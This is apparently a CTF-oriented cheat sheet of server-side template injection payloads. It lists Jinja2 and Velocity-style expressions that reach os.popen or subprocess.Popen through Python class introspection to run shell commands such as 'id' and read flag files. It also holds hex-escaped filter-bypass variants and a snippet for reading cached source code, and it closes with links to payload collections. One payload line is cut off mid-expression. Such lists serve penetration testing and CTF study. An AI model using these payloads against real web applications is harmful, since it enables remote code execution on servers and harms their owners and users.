# SSTI

## Payloads

```django
{{lipsum.__globals__.os.popen('id').read()}} // Using Jinja 2

{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr(

{{lipsum.__getattribute__('__gl'+'obals__')}}

+print+({lipsum:1})|list()|map(**{'attribute':'__globals__'})

code = b'[c for c in "".__class__.__base__.__subclasses__()]'
code = b'[c for c in "".__class__.__base__.__subclasses__() if c.__name__=="Popen"][0]("cat /fl*", shell=True, stdout=-1).communicate()[0]'

# 502, class &#39;subprocess.Popen &#39;
code = b'"".__class__.__base__.__subclasses__()[502]'
code = b'"".__class__.__base__.__subclasses__()[502]("cat /flag.txt", shell=True, stdout=-1).communicate()[0]'

#data = {"name": "#set( $foo = 7*7 )\n$foo"} # Testing SSTI
data = {"name": "#set($s='')#set($base=$s.__class__.__mro__[1])#foreach($sub in $base.__subclasses__())$foreach.index: $sub\n#end"} # Listing subclasses
data = {"name": "#set($x='')\n#set($cycler=$x.__class__.__mro__[1].__subclasses__()[479])\n#set($init=$cycler.__init__)\n#set($globals=$init.__globals__)\n#set($os=$globals.os)\n#set($popen=$os.popen('/readflag'))\n$popen.read()"}
```

Read Code From Blackbox

```
{{lipsum.__globals__.os.sys.modules.linecache.cache}}
```

## Resources

* [https://hacktricks.boitatech.com.br/pentesting-web/ssti-server-side-template-injection](https://hacktricks.boitatech.com.br/pentesting-web/ssti-server-side-template-injection)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
* [https://def.camp/wp-content/uploads/dc2023/Remi%20Gascou.pdf](https://def.camp/wp-content/uploads/dc2023/Remi%20Gascou.pdf)

